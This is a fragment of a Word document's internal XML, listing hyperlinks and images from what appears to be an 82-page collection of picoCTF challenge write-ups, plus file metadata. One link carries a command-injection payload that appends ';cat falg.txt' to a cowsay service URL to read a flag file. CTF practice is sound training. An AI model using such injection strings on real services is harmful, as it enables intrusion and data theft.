Target="https://caas.mars.picoctf.net/cowsay/hellow;%20cat%20falg.txt" TargetMode="External"/><Relationship Id="rId78" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image26.png"/><Relationship Id="rId94" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://mercury.picoctf.net/static/5ef2e9103d55972d975437f68175b9ab/dolls.jpg" TargetMode="External"/><Relationship Id="rId99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://jupiter.challenges.picoctf.org:13594" TargetMode="External"/><Relationship Id="rId101" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image33.png"/><Relationship Id="rId122" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:5428/" TargetMode="External"/><Relationship Id="rId143"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artifacts.picoctf.net/c/101/codebook.txt" TargetMode="External"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/79/dictionary.txt" TargetMode="External"/><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image11.png"/><Relationship Id="rId68" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://jupiter.challenges.picoctf.org:36474" TargetMode="External"/><Relationship Id="rId89" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/PoCInnovation/ReblochonWriteups/tree/master/PicoCTF2021" TargetMode="External"/><Relationship Id="rId112" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image42.png"/><Relationship Id="rId133" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://saturn.picoctf.net:63909/" TargetMode="External"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/17/level2.flag.txt.enc" TargetMode="External"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image4.png"/><Relationship Id="rId58" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://saturn.picoctf.net:50761/" TargetMode="External"/><Relationship Id="rId79" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer" TargetMode="External"/><Relationship Id="rId102" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image34.png"/><Relationship Id="rId123" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:25395/robots.txt"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979</TotalTime>
  <Pages>82</Pages>
  <Words>9204</Words>
  <Characters>52465</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Jun Wang</cp:lastModifiedBy>
  <cp:revision>34</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2022-08-26T09:47:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2022-08-30T08:24:00Z</dcterms:modified>
  <dc:language>en-US</dc:language>
</cp:coreProperties>
</file>